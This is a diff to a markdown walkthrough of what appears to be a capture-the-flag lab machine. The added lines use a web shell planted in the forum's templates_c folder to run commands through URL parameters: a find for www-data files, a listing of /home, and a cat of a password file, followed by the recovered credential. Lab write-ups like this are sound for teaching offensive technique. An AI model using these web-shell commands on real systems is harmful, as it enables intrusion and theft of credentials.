@@ -344,8 +344,24 @@ Now let's try supplying a system command as a parameter: `https://192.168.56.103
 
 Now we get the results of both select 1 query and the whoami command seperated into different columns. It appears that the current user is [`www-data`](https://askubuntu.com/questions/873839/what-is-the-www-data-user)
 
-_The web server has to be run under a specific user. That user must exist._
+_The web server has to be run under a specific user._
 
 _If it were run under root, then all the files would have to be accessible by root and the user would need to be root to access the files. With root being the owner, a compromised web server would have access to your entire system._
 
 _By default the configuration of the owner is www-data in the Ubuntu configuration of Apache2._
+
+`https://192.168.56.103/forum/templates_c/cmd.php?c=find%20/%20-user%20www-data%202%3E/dev/null`
+
+![image](https://github.com/user-attachments/assets/33b95b55-4451-4fff-91dc-b26316bdfc3c)
+
+Interesting
+
+`https://192.168.56.103/forum/templates_c/cmd.php?c=ls%20/home`
+
+![image](https://github.com/user-attachments/assets/2a66352d-89ed-4bb0-9155-90495e68741b)
+
+`https://192.168.56.103/forum/templates_c/cmd.php?c=cat%20/home/LOOKATME/password`
+
+![image](https://github.com/user-attachments/assets/03d0eff6-7cc2-4c1a-9766-5fc0d6350c2e)
+
+`lmezard:G!@M6f4Eatau{sF"`
